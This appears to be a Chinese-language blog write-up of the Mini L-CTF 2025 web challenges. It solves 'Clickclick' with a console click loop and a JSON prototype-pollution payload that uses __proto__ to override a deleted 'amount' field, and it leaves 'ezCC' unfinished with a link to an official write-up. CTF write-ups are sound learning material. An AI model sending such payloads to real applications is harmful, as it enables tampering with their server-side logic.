---
title: Mini L-CTF
categories:
- CTF
tag:
- CTF
- web
- WriteUp
date: 2025-05-15 23:58:52
excerpt: 未完待续...
index_img: /img/miniLCTF2025/miniLCTF2025.png
banner_img: /img/miniLCTF2025/miniLCTF2025.png
---

# Mini L-CTF

# Clickclick

这题考点是 js 的原型链污染，之前没怎么接触过记录一下。

题目描述点击 10000 次出现不一样的东西，打开抓包多次点击发现每 50 次发一次包如下

```json
{
  "type": "set",
  "point": {
    "amount": 50
  }
}
```

修改 amount 值尝试 1000、10000 等参数，发现到达 1000 后均返回“你按的太快了！”

审计一下前端代码或者使用如下代码在控制台运行即可看到点击 10000 次的提示

```json
but = document.querySelector("#app > main > div > button")
for (var i = 0; i < 10000; i++) {
    but.click();
}
```

![](/img/miniLCTF2025/I142bjCa8ofO3dx3KKpcGgwHnDe.png)

if ( req.body.point.amount == 0 || req.body.point.amount == null) { delete req.body.point.amount }

也就是说当传递的 amount 参数为 0 时会直接删除，结合后端语言为 JavaScript 所以考虑原型链污染，使用 payload 如下，删除后污染原型

```
{
  "type": "set",
  "point": {
    "amount": 0,
    "__proto__": {
      "amount": 10000
    }
  },
}
```

# ezCC

暂时没时间了，标记一下后续学习整理更新

[https://github.com/XDSEC/miniLCTF_2025/blob/main/OfficialWriteups/Web/ezCC_Official.pdf](https://github.com/XDSEC/miniLCTF_2025/blob/main/OfficialWriteups/Web/ezCC_Official.pdf)
